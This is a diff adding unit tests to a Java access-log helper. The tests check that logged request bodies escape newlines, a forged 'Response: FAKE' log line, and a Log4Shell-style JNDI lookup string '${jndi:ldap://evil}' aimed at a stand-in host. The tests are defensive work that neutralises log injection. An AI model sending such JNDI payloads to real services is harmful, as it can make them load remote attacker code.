@@ -32,6 +32,24 @@ class AccessLogBodySupportTest {
     }
 
     @Test
+    void formatBodyEscapesNewlines() {
+        assertThat(AccessLogBodySupport.formatBody(Buffer.buffer("\nResponse: FAKE"), 100))
+                .isEqualTo("\\nResponse: FAKE");
+    }
+
+    @Test
+    void formatBodyEscapesLookupSequences() {
+        assertThat(AccessLogBodySupport.formatBody(Buffer.buffer("${jndi:ldap://evil}"), 100))
+                .isEqualTo("$\\{jndi:ldap://evil}");
+    }
+
+    @Test
+    void formatRequestBodyTooLargeReturnsPlaceholder() {
+        assertThat(AccessLogBodySupport.formatRequestBodyTooLarge(512 * 1024))
+                .isEqualTo("<524288 bytes, body too large to log>");
+    }
+
+    @Test
     void patternContainsRequestBodyToken() {
         assertThat(AccessLogBodySupport.resolveNamedPattern("common")).doesNotContain(AccessLogBodySupport.REQUEST_BODY_TOKEN);
         assertThat(AccessLogBodySupport.resolveNamedPattern("%{REQUEST_BODY}"))
